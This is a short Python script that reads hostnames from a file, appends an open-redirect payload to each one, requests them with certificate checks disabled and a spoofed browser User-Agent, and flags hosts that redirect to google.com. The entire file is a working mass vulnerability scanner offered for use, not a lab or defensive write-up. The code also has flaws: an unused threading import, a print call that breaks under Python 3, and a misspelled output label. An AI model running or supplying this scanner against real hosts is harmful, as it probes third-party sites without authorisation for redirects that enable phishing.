import pycurl
import threading


def operate(url,line):
	c = pycurl.Curl()
	c.setopt(pycurl.URL, url)
	c.setopt(pycurl.DNS_SERVERS, '8.8.8.8')
	c.setopt(pycurl.HTTPHEADER, ['User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'])
	c.setopt(pycurl.FOLLOWLOCATION, True)
	c.setopt(pycurl.WRITEFUNCTION, lambda x: None)
	c.setopt(pycurl.SSL_VERIFYPEER, 0)
	c.setopt(pycurl.SSL_VERIFYHOST, 0)
	c.setopt(pycurl.CONNECTTIMEOUT, 30)
	try:
		c.perform()
		resurl=c.getinfo(pycurl.EFFECTIVE_URL) 
		if "https://google.com/" in resurl:
			print ("Vulnearble - " + line).strip()
	except:
		pass


def main():
	threads = []
	payload="//google.com/%2F..".strip()		
	file = open("min.txt","r")
	for line in file:
		url = "http://"+line.strip()
		final_url=url+payload
		operate(final_url,line)
	
main()


